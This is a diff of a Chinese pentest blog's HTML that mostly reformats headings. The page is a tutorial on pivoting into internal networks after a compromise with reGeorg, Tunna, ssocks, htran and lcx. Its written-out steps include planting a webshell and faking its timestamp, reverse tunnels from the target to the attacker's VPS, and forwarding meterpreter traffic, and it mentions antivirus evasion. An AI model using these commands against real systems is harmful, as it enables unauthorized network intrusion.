@@ -85,37 +85,25 @@
             
             <li class="menu-item">
                 <a href="/">
-                    主页
+                    home
                 </a>
             </li>
             
             <li class="menu-item">
                 <a href="/archives">
-                    所有文章
+                    archives
                 </a>
             </li>
             
             <li class="menu-item">
                 <a href="/about">
-                    关于自己
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/tags">
-                    标签
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/categories">
-                    分类
+                    about me
                 </a>
             </li>
             
             <li class="menu-item">
                 <a href="/contact">
-                    一起交流
+                    blogs
                 </a>
             </li>
             
@@ -171,7 +159,7 @@
     
         <div class="content">
             <p><br></p>
-<h5 id="reGeorg-基于py-实际渗透过程中用的相对较多-稳定性一般-不过-使用还是非常方便的-推荐"><a href="#reGeorg-基于py-实际渗透过程中用的相对较多-稳定性一般-不过-使用还是非常方便的-推荐" class="headerlink" title="reGeorg[基于py,实际渗透过程中用的相对较多,稳定性一般,不过,使用还是非常方便的,推荐]:"></a>reGeorg[基于py,实际渗透过程中用的相对较多,稳定性一般,不过,使用还是非常方便的,推荐]:</h5><p>1,和前面都一样,先把代理(webshell)上传到目标的网站目录中再说,记得顺手改下webshell的时间戳,尝试访问该shell,返回正常后,即可本地执行绑定操作,如下<br><img src="/img/regeorg_weshell.png" alt=""><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python regerogsocksproxy.py -u "http://目标域名/tunnel.aspx" -p 绑定的本地端口</span></div></pre></td></tr></table></figure></p>
+<h5 id="reGeorg-基于py-实际渗透过程中用的相对较多-稳定性一般-不过-使用还是非常方便的-推荐"><a href="#reGeorg-基于py-实际渗透过程中用的相对较多-稳定性一般-不过-使用还是非常方便的-推荐" class="headerlink" title="reGeorg[基于py,实际渗透过程中用的相对较多,稳定性一般,不过,使用还是非常方便的,推荐]:"></a>reGeorg[基于py,实际渗透过程中用的相对较多,稳定性一般,不过,使用还是非常方便的,推荐]:</h5><p><br><br>1,和前面都一样,先把代理(webshell)上传到目标的网站目录中再说,记得顺手改下webshell的时间戳,尝试访问该shell,返回正常后,即可本地执行绑定操作,如下<br><img src="/img/regeorg_weshell.png" alt=""><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python regerogsocksproxy.py -u "http://目标域名/tunnel.aspx" -p 绑定的本地端口</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/regeorg_weshell_proxy.png" alt=""><br></p>
 <p>2,连接绑定好的本地端口,推荐用proxifier或者sockscap,然后往里面添加一些自己常用的内网渗透工具,就可以对目标进行正常的内网渗透了<br><img src="/img/regeorg_weshell_proxifier.png" alt=""><br><br><img src="/img/regeorg_weshell_res.png" alt=""><br></p>
 <p>3,实际渗透中,个人还是比较推荐用这个,比较稳定,使用也比较简单,不过,还是有些令人不太愉快的地方,待后期解决了,再单独拿出来说<br><br></p>
@@ -206,7 +194,7 @@
     
         <div class="content">
             <p><br></p>
-<h4 id="Tunna-实际渗透中-不太推荐-不稳定-经常断-阻塞-基于py编写"><a href="#Tunna-实际渗透中-不太推荐-不稳定-经常断-阻塞-基于py编写" class="headerlink" title="Tunna[实际渗透中,不太推荐,不稳定,经常断,阻塞,基于py编写]:"></a>Tunna[实际渗透中,不太推荐,不稳定,经常断,阻塞,基于py编写]:</h4><p>1,依然是先把代理端(webshell)上传到目标的网站目录中,并尝试访问该webshell,返回正常后,即可在本地执行下面的语句:<br><img src="/img/tunna_client.png" alt=""><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python proxy.py -u "http://目标域名/conn.aspx" -l 要绑定的本地端口 -r 远程机器上的指定端口[3389] -v </span></div><div class="line"><span class="comment"># python proxy.py -u "http://目标域名/conn.aspx" -l 要绑定的本地端口 -a 内网机器的ip -r 内网机器的指定端口 -v  </span></div><div class="line"><span class="comment"># python proxy.py -u "http://目标域名/conn.aspx" -l 要绑定的本地端口 -r 远程机器上的指定端口[22] -s[转发ssh服务需要加上此选项] -v</span></div></pre></td></tr></table></figure></p>
+<h5 id="Tunna-实际渗透中-不太推荐-不稳定-经常断-阻塞-基于py编写"><a href="#Tunna-实际渗透中-不太推荐-不稳定-经常断-阻塞-基于py编写" class="headerlink" title="Tunna[实际渗透中,不太推荐,不稳定,经常断,阻塞,基于py编写]:"></a>Tunna[实际渗透中,不太推荐,不稳定,经常断,阻塞,基于py编写]:</h5><p><br><br>1,依然是先把代理端(webshell)上传到目标的网站目录中,并尝试访问该webshell,返回正常后,即可在本地执行下面的语句:<br><img src="/img/tunna_client.png" alt=""><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python proxy.py -u "http://目标域名/conn.aspx" -l 要绑定的本地端口 -r 远程机器上的指定端口[3389] -v </span></div><div class="line"><span class="comment"># python proxy.py -u "http://目标域名/conn.aspx" -l 要绑定的本地端口 -a 内网机器的ip -r 内网机器的指定端口 -v  </span></div><div class="line"><span class="comment"># python proxy.py -u "http://目标域名/conn.aspx" -l 要绑定的本地端口 -r 远程机器上的指定端口[22] -s[转发ssh服务需要加上此选项] -v</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/tunna_server.png" alt=""><br></p>
 <p>2,先连接刚才绑定到的本地端口,在尝试用mstsc,putty等工具进行连接<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mstsc <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> 绑定的本地端口</div></pre></td></tr></table></figure></p>
 <p><img src="/img/tunna_server_res.png" alt=""><br><br>3,比较的不稳定,尤其是php脚本,已经不太兼容php5.3以后的版本了,而且还要开启某些模块(socket)支持,利用条件确实有点儿苛刻<br>4,另外,tunna已经有相应的msf模块,也可以选择直接把它加到msf中使用<br><br></p>
@@ -280,23 +268,22 @@
     
         <div class="content">
             <p><br></p>
-<h4 id="在不同平台下使用ssocks反向代理-linux内网中可能会用的比较多-当然-它一样也提供了相应的win版本"><a href="#在不同平台下使用ssocks反向代理-linux内网中可能会用的比较多-当然-它一样也提供了相应的win版本" class="headerlink" title="在不同平台下使用ssocks反向代理[linux内网中可能会用的比较多,当然,它一样也提供了相应的win版本]:"></a>在不同平台下使用ssocks反向代理[linux内网中可能会用的比较多,当然,它一样也提供了相应的win版本]:</h4><p><br></p>
-<h4 id="关于socks反向代理原理的简要说明"><a href="#关于socks反向代理原理的简要说明" class="headerlink" title="关于socks反向代理原理的简要说明:"></a>关于socks反向代理原理的简要说明:</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;其实,socks反向代理的通信原理还是比较简单的,就是在控制端和目标端同时开放一个端口,作为两端机器之间通信的这么一个专属通道(有点儿类似管道),说的再形象一点,是这样,当控制端想访问目标内网中的其他的机器的某个端口,目标端就会帮忙把要访问的那个端口的数据拿过来,放到之前已经建立好的这条通道的端口上,然后,控制端直接到这个地方来取即可,有点儿类似中介,socket嘛,本来就是个管道<br><br></p>
-<h4 id="在linux中使用ssocks"><a href="#在linux中使用ssocks" class="headerlink" title="在linux中使用ssocks:"></a>在linux中使用ssocks:</h4><p>1,如果目标是linux机器,可能还需要你自己先编译安装下,步骤非常简单,如下,如果过程中有什么报错,仔细看下报的具体是什么错误,顺手解决下,如果是编译器或者依赖库的问题,按照相应的提示装上即可:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tar -zxf ssocks-0.0.14.tar.gz</span></div><div class="line"><span class="comment"># cd ssocks-0.0.14</span></div><div class="line"><span class="comment"># ./configure &amp;&amp; make &amp;&amp; make install</span></div><div class="line"><span class="comment"># echo $?</span></div></pre></td></tr></table></figure></p>
+<h5 id="在不同平台下使用ssocks反向代理-linux内网中可能会用的比较多-当然-它一样也提供了相应的win版本"><a href="#在不同平台下使用ssocks反向代理-linux内网中可能会用的比较多-当然-它一样也提供了相应的win版本" class="headerlink" title="在不同平台下使用ssocks反向代理[linux内网中可能会用的比较多,当然,它一样也提供了相应的win版本]:"></a>在不同平台下使用ssocks反向代理[linux内网中可能会用的比较多,当然,它一样也提供了相应的win版本]:</h5><p><br></p>
+<h5 id="关于socks反向代理原理的简要说明"><a href="#关于socks反向代理原理的简要说明" class="headerlink" title="关于socks反向代理原理的简要说明:"></a>关于socks反向代理原理的简要说明:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;其实,socks反向代理的通信原理还是比较简单的,就是在控制端和目标端同时开放一个端口,作为两端机器之间通信的这么一个专属通道(有点儿类似管道),说的再形象一点,是这样,当控制端想访问目标内网中的其他的机器的某个端口,目标端就会帮忙把要访问的那个端口的数据拿过来,放到之前已经建立好的这条通道的端口上,然后,控制端直接到这个地方来取即可,有点儿类似中介,socket嘛,本来就是个管道<br><br></p>
+<h5 id="在linux中使用ssocks"><a href="#在linux中使用ssocks" class="headerlink" title="在linux中使用ssocks:"></a>在linux中使用ssocks:</h5><p>1,如果目标是linux机器,可能还需要你自己先编译安装下,步骤非常简单,如下,如果过程中有什么报错,仔细看下报的具体是什么错误,顺手解决下,如果是编译器或者依赖库的问题,按照相应的提示装上即可:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tar -zxf ssocks-0.0.14.tar.gz</span></div><div class="line"><span class="comment"># cd ssocks-0.0.14</span></div><div class="line"><span class="comment"># ./configure &amp;&amp; make &amp;&amp; make install</span></div><div class="line"><span class="comment"># echo $?</span></div></pre></td></tr></table></figure></p>
 <p>2,本地机器上执行,一般都是你自己的vps,如果开了防火墙记得把端口放开:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rcsocks -l 1234 -p 1080 -vv</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/sscosk_client.png" alt=""><br></p>
 <p>3,在目标机器上执行(自带台运行选项,实际渗透中可以把它加上):<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rssocks -s  192.168.3.41(实际中可能是你vps的ip):1080 -vv</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/sscosk_server.png" alt=""><br></p>
 <p>4,本地通过各种代理工具,连到socks代理的端口上,即可轻松访问目标内网中的资源<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">proxychains</div><div class="line">proxifier</div><div class="line">putty</div></pre></td></tr></table></figure></p>
-<p><img src="/img/sscosk_proxifier.png" alt=""><br><br><img src="/img/sscosk_proxifier_ssh.png" alt=""><br><br><img src="/img/sscosk_proxifier_res.png" alt=""><br></p>
-<h4 id="5-从连接信息中我们看到了socks连接建立成功的提示-如下"><a href="#5-从连接信息中我们看到了socks连接建立成功的提示-如下" class="headerlink" title="5,从连接信息中我们看到了socks连接建立成功的提示,如下"></a>5,从连接信息中我们看到了socks连接建立成功的提示,如下</h4><p><img src="/img/sscosk_proxifier_res_1.png" alt=""><br><br><img src="/img/sscosk_proxifier_res_2.png" alt=""><br></p>
-<p><br><br></p>
-<h4 id="在win中使用ssocks"><a href="#在win中使用ssocks" class="headerlink" title="在win中使用ssocks:"></a>在win中使用ssocks:</h4><p>1,本地机器上执行,一般都是自己的vps,如果开了防火墙记得把端口放开:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rcsocks.exe -l 1234 -p 1080 -vv</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sscosk_proxifier.png" alt=""><br><img src="/img/sscosk_proxifier_ssh.png" alt=""><br><img src="/img/sscosk_proxifier_res.png" alt=""><br></p>
+<p>5,从连接信息中我们看到了socks连接建立成功的提示,如下<br><img src="/img/sscosk_proxifier_res_1.png" alt=""><br><img src="/img/sscosk_proxifier_res_2.png" alt=""><br><br><br><br></p>
+<h5 id="在win中使用ssocks"><a href="#在win中使用ssocks" class="headerlink" title="在win中使用ssocks:"></a>在win中使用ssocks:</h5><p>1,本地机器上执行,一般都是自己的vps,如果开了防火墙记得把端口放开:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rcsocks.exe -l 1234 -p 1080 -vv</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/sscosk_win_rcsocks.png" alt=""><br></p>
 <p>2,在目标机器上执行(自带台运行选项,实际渗透中可以把它加上):<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rssocks.exe -s  192.168.3.41(实际中可能是你vps的ip):1080 -vv</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/sscosk_win_rssocks.png" alt=""><br></p>
-<p>3,本地通过各种代理工具,连到socks代理的端口上,而后正常的访问目标内网资源即可<br><img src="/img/sscosk_win_proxifier.png" alt=""><br><br><img src="/img/sscosk_win_proxifier_rule.png" alt=""><br><br><img src="/img/sscosk_win_proxifier_res.png" alt=""><br><br><br></p>
-<h4 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;这也是实际渗透过程个人比较推荐的内网代理方式,尤其当目标机器存在公网ip的时候,用这种方式进行内网渗透无疑是极好的,此工具基本是没有任何依赖,使用简单粗暴,相对来说也比较轻量,免杀就更不用说了(因为根本就不需要免杀),除此之外,还有很多其它优点,这里就不一一说了,大家自己多实践就会感受到了<br><br><br></p>
+<p>3,本地通过各种代理工具,连到socks代理的端口上,而后正常的访问目标内网资源即可<br><img src="/img/sscosk_win_proxifier.png" alt=""><br><img src="/img/sscosk_win_proxifier_rule.png" alt=""><br><img src="/img/sscosk_win_proxifier_res.png" alt=""><br><br><br></p>
+<h5 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;这也是实际渗透过程个人比较推荐的内网代理方式,尤其当目标机器存在公网ip的时候,用这种方式进行内网渗透无疑是极好的,此工具基本是没有任何依赖,使用简单粗暴,相对来说也比较轻量,免杀就更不用说了(因为根本就不需要免杀),除此之外,还有很多其它优点,这里就不一一说了,大家自己多实践就会感受到了<br><br><br></p>
 
         </div>
     
@@ -328,13 +315,13 @@
     
         <div class="content">
             <p><br></p>
-<h3 id="htran-另一款要比lcx好用很多的端口转发及socks代理工具"><a href="#htran-另一款要比lcx好用很多的端口转发及socks代理工具" class="headerlink" title="htran 另一款要比lcx好用很多的端口转发及socks代理工具"></a>htran 另一款要比lcx好用很多的端口转发及socks代理工具</h3><p>1)首先是常规的端口转发功能:<br>1,首先,到vps上监听好指定的端口:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># htran -p -listen 443 1234</span></div></pre></td></tr></table></figure></p>
+<h5 id="htran-另一款要比lcx好用很多的端口转发及socks代理工具"><a href="#htran-另一款要比lcx好用很多的端口转发及socks代理工具" class="headerlink" title="htran 另一款要比lcx好用很多的端口转发及socks代理工具"></a>htran 另一款要比lcx好用很多的端口转发及socks代理工具</h5><p><br><br>1)首先,是常规的端口转发功能:<br>1,首先,到vps上监听好指定的端口:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># htran -p -listen 443 1234</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/htran_listen_win.png" alt=""><br></p>
 <p>2,然后,在回到目标机器上执行:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># htran -p -slave 192.168.3.251(实际测试中应该是自己vps的ip) 443 192.168.32.134 3389</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/htran_slave_win.png" alt=""><br></p>
 <p>3,最后,再在vps本地用指定的工具连接到转发到本地的端口上,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">mstsc:</span> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="symbol">:</span><span class="number">1234</span></div><div class="line"><span class="symbol">putty:</span> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">1234</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/htran_listen_win_1.png" alt=""><br><br><img src="/img/htran_listen_win_2.png" alt=""><br><br><br><br></p>
-<p>2)另一个比较实用的socks代理功能,让目标机器作为socks代理端,对目标内网进行渗透,不过这可能需要目标机器有个固定的公网ip,不然怎么练上去呢:</p>
+<p>2)其次,是相对比较实用的socks代理功能,让目标机器作为socks代理端,对目标内网进行渗透,不过这可能需要目标机器有个固定的公网ip,不然怎么练上去呢:</p>
 <p>1,先在目标机器上安装并启动socks5服务<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># HTran2.4.exe -install</span></div><div class="line"><span class="comment"># HTran2.4.exe -start</span></div><div class="line"><span class="comment"># htran -remove  不用时,卸掉即可</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/htran_socks_install_start.png" alt=""><br></p>
 <p>2,然后,再回到自己的vps上监听等会要连回来的端口,这里-s的意思表示启用socks代理,而-p表示只进行口转发<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># HTran2.4.exe -s -listen 1080 1234</span></div></pre></td></tr></table></figure></p>
@@ -343,7 +330,7 @@
 <p><img src="/img/htran_socks_connect.png" alt=""><br></p>
 <p>4,连接建立以后,我们现在就可以回到我们自己本地的渗透系统中,安装好socskcap代理工具(当然,你用别的也一样),然后再工具设置中填写好vps的ip和socks代理的端口(这里是1234这个端口),不过,要注意,如果你的vps开了防火墙,务必记得把这几个代理用到的端口都放开,要不然,数据是过不来的<br><img src="/img/htran_socks_sockcap.png" alt=""><br></p>
 <p>5,最后,在把自己常用的一些内网渗透工具加到该代理工具中,就可以进行正常内网渗透了,效果如下<br><img src="/img/htran_socks_sockcap_res.png" alt=""><br><br><img src="/img/htran_socks_sockcap_rdp.png" alt=""><br><br><br></p>
-<h4 id="关于htran"><a href="#关于htran" class="headerlink" title="关于htran:"></a>关于htran:</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;可能唯一的缺点就是需要免杀,工具也相对比较老了,2.4的源码应该早就放出来了,有兴趣可以down下来仔细分析下,个人觉得在实际测试中,它比lcx稍稳定一些,速度也还可以,确实是个很贴心的小工具<br><br><br></p>
+<h5 id="关于htran"><a href="#关于htran" class="headerlink" title="关于htran:"></a>关于htran:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;可能唯一的缺点就是需要免杀,工具也相对比较老了,2.4的源码应该早就放出来了,有兴趣可以down下来仔细分析下,个人觉得在实际测试中,它比lcx稍稳定一些,速度也还可以,确实是个很贴心的小工具<br><br><br></p>
 
         </div>
     
@@ -375,19 +362,20 @@
     
         <div class="content">
             <p><br></p>
-<h3 id="lcx-linux-win-平台下都有相应的已经编译好的版本-后期我会把自己用的工具都打包提供给大家-原理想必大家早已经非常清楚-其实本来也非常简单-这里就不废话了-简单使用如下"><a href="#lcx-linux-win-平台下都有相应的已经编译好的版本-后期我会把自己用的工具都打包提供给大家-原理想必大家早已经非常清楚-其实本来也非常简单-这里就不废话了-简单使用如下" class="headerlink" title="lcx [linux,win 平台下都有相应的已经编译好的版本,后期我会把自己用的工具都打包提供给大家],原理想必大家早已经非常清楚,其实本来也非常简单,这里就不废话了,简单使用如下:"></a>lcx [linux,win 平台下都有相应的已经编译好的版本,后期我会把自己用的工具都打包提供给大家],原理想必大家早已经非常清楚,其实本来也非常简单,这里就不废话了,简单使用如下:</h3><h4 id="1-把来自外部的某个端口上的流量转到本地的某个端口上"><a href="#1-把来自外部的某个端口上的流量转到本地的某个端口上" class="headerlink" title="1,把来自外部的某个端口上的流量转到本地的某个端口上"></a>1,把来自外部的某个端口上的流量转到本地的某个端口上</h4><h5 id="首先-在自己的vps上执行-监听准备"><a href="#首先-在自己的vps上执行-监听准备" class="headerlink" title="首先,在自己的vps上执行(监听准备):"></a>首先,在自己的vps上执行(监听准备):</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># lcx -listen 监听来自外部的某个端口上的流量 转发到指定的本地端口上</span></div><div class="line"><span class="comment"># lcx -listen 3389 1234  把来自外部的3389端口的流量转到本地的1234端口上</span></div><div class="line"><span class="comment"># lcx -listen 3389 1234  把来自外部的3389端口的流量转到本地的1234端口上</span></div><div class="line"><span class="comment"># lcx -listen 443  1234  把来自外部的443端口的流量转到本地的1234端口上</span></div></pre></td></tr></table></figure>
+<h5 id="lcx-linux-win-平台下都有相应的已经编译好的版本-后期我会把自己用的工具都打包提供给大家-原理想必大家早已经非常清楚-其实本来也非常简单-这里就不废话了-简单使用如下"><a href="#lcx-linux-win-平台下都有相应的已经编译好的版本-后期我会把自己用的工具都打包提供给大家-原理想必大家早已经非常清楚-其实本来也非常简单-这里就不废话了-简单使用如下" class="headerlink" title="lcx [linux,win 平台下都有相应的已经编译好的版本,后期我会把自己用的工具都打包提供给大家],原理想必大家早已经非常清楚,其实本来也非常简单,这里就不废话了,简单使用如下:"></a>lcx [linux,win 平台下都有相应的已经编译好的版本,后期我会把自己用的工具都打包提供给大家],原理想必大家早已经非常清楚,其实本来也非常简单,这里就不废话了,简单使用如下:</h5><p><br></p>
+<h5 id="1-把来自外部的某个端口上的流量转到本地的某个端口上"><a href="#1-把来自外部的某个端口上的流量转到本地的某个端口上" class="headerlink" title="1,把来自外部的某个端口上的流量转到本地的某个端口上"></a>1,把来自外部的某个端口上的流量转到本地的某个端口上</h5><h5 id="首先-在自己的vps上执行-监听准备"><a href="#首先-在自己的vps上执行-监听准备" class="headerlink" title="首先,在自己的vps上执行(监听准备):"></a>首先,在自己的vps上执行(监听准备):</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># lcx -listen 监听来自外部的某个端口上的流量 转发到指定的本地端口上</span></div><div class="line"><span class="comment"># lcx -listen 3389 1234  把来自外部的3389端口的流量转到本地的1234端口上</span></div><div class="line"><span class="comment"># lcx -listen 3389 1234  把来自外部的3389端口的流量转到本地的1234端口上</span></div><div class="line"><span class="comment"># lcx -listen 443  1234  把来自外部的443端口的流量转到本地的1234端口上</span></div></pre></td></tr></table></figure>
 <p><img src="/img/lcx_listen_win.png" alt=""><br></p>
 <h5 id="而后-回到目标机器上去执行"><a href="#而后-回到目标机器上去执行" class="headerlink" title="而后,回到目标机器上去执行:"></a>而后,回到目标机器上去执行:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># lcx -slave 公网vps的ip  在vps上监听的端口  目标机器的ip 目标机器上指定的端口[通常是远程桌面或者ssh]</span></div><div class="line"><span class="comment"># lcx -slave 103.*.*.* 53 192.168.3.23 3389  把目标机器的3389端口的流量转发到自己vps的53端口上</span></div><div class="line"><span class="comment"># lcx -slave 103.*.*.* 53 192.168.3.23 3389  把目标机器的3389端口的流量转发到自己vps的53端口上</span></div><div class="line"><span class="comment"># lcx -slave 103.*.*.* 53 192.168.3.23 443   把目标机器的3389端口的流量转发到自己vps的53端口上</span></div></pre></td></tr></table></figure>
 <p><img src="/img/lcx_listen_win_slave.png" alt=""><br></p>
 <h5 id="最后-再回到自己的vps上-看到连接正常建立-就可以用指定工具连接到目标机器上了"><a href="#最后-再回到自己的vps上-看到连接正常建立-就可以用指定工具连接到目标机器上了" class="headerlink" title="最后,再回到自己的vps上,看到连接正常建立,就可以用指定工具连接到目标机器上了:"></a>最后,再回到自己的vps上,看到连接正常建立,就可以用指定工具连接到目标机器上了:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">mstsc:</span> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="symbol">:</span><span class="number">1234</span>  连目标的远程桌面</div><div class="line"><span class="symbol">putty:</span> <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">1234</span>  连目标的ssh</div></pre></td></tr></table></figure>
-<h5 id="这时当你在本地访问-127-0-0-1-的1234端口其实就相当于访问目标机器的rdp-3389端口-或者ssh-22端口"><a href="#这时当你在本地访问-127-0-0-1-的1234端口其实就相当于访问目标机器的rdp-3389端口-或者ssh-22端口" class="headerlink" title="这时当你在本地访问 127.0.0.1 的1234端口其实就相当于访问目标机器的rdp(3389端口)或者ssh(22端口)"></a>这时当你在本地访问 127.0.0.1 的1234端口其实就相当于访问目标机器的rdp(3389端口)或者ssh(22端口)</h5><p><img src="/img/lcx_listen_win_slave_res.png" alt=""><br></p>
-<h4 id="关于lcx在linux中的用法-大同小异-只是参数不同而已-如下"><a href="#关于lcx在linux中的用法-大同小异-只是参数不同而已-如下" class="headerlink" title="关于lcx在linux中的用法,大同小异,只是参数不同而已,如下:"></a>关于lcx在linux中的用法,大同小异,只是参数不同而已,如下:</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ./lcx -m 2 -p1 443 -h2 192.168.3.41(实际中可能是你vps的地址) -p2 1234  首先,还是在vps上执行监听</span></div></pre></td></tr></table></figure>
+<h5 id="这时当你在本地访问-127-0-0-1-的1234端口其实就相当于访问目标机器的rdp-3389端口-或者ssh-22端口"><a href="#这时当你在本地访问-127-0-0-1-的1234端口其实就相当于访问目标机器的rdp-3389端口-或者ssh-22端口" class="headerlink" title="这时当你在本地访问 127.0.0.1 的1234端口其实就相当于访问目标机器的rdp(3389端口)或者ssh(22端口)"></a>这时当你在本地访问 127.0.0.1 的1234端口其实就相当于访问目标机器的rdp(3389端口)或者ssh(22端口)</h5><p><img src="/img/lcx_listen_win_slave_res.png" alt=""><br><br><br></p>
+<h5 id="关于lcx在linux中的用法-大同小异-只是参数不同而已-如下"><a href="#关于lcx在linux中的用法-大同小异-只是参数不同而已-如下" class="headerlink" title="关于lcx在linux中的用法,大同小异,只是参数不同而已,如下:"></a>关于lcx在linux中的用法,大同小异,只是参数不同而已,如下:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ./lcx -m 2 -p1 443 -h2 192.168.3.41(实际中可能是你vps的地址) -p2 1234  首先,还是在vps上执行监听</span></div></pre></td></tr></table></figure>
 <p><img src="/img/lcx_linux_1.png" alt=""><br></p>
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ./lcx -m 3 -h1 192.168.3.40(目标机器的ip) -p1 22 -h2 192.168.3.41(vps的ip) -p2 443 意思是把目标机器的22端口转到vps的443端口上</span></div></pre></td></tr></table></figure>
 <p><img src="/img/lcx_linux_2.png" alt=""><br></p>
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ssh root@127.0.0.1 -p 1234 当连接正常建立后,在vps上连接本地的1234端口实际连的就是目标机器(192.168.3.40)的22端口,效果如下</span></div></pre></td></tr></table></figure>
-<p><img src="/img/lcx_linux_3.png" alt=""><br><br><img src="/img/lcx_linux_4.png" alt=""><br><br><br><br></p>
-<h4 id="2-把来自外部的某个端口上的流量转到指定的其它机器上-典型应用场景-”-把来自公网的meterpreter直接通过vps转到本地的msf中-“-流程大致如下"><a href="#2-把来自外部的某个端口上的流量转到指定的其它机器上-典型应用场景-”-把来自公网的meterpreter直接通过vps转到本地的msf中-“-流程大致如下" class="headerlink" title="2,把来自外部的某个端口上的流量转到指定的其它机器上,典型应用场景,” 把来自公网的meterpreter直接通过vps转到本地的msf中 “,流程大致如下:"></a>2,把来自外部的某个端口上的流量转到指定的其它机器上,典型应用场景,” 把来自公网的meterpreter直接通过vps转到本地的msf中 “,流程大致如下:</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># lcx -tran 来自外部的端口 指定机器的ip 指定机器上的端口</span></div></pre></td></tr></table></figure>
+<p><img src="/img/lcx_linux_3.png" alt=""><br><img src="/img/lcx_linux_4.png" alt=""><br><br><br><br></p>
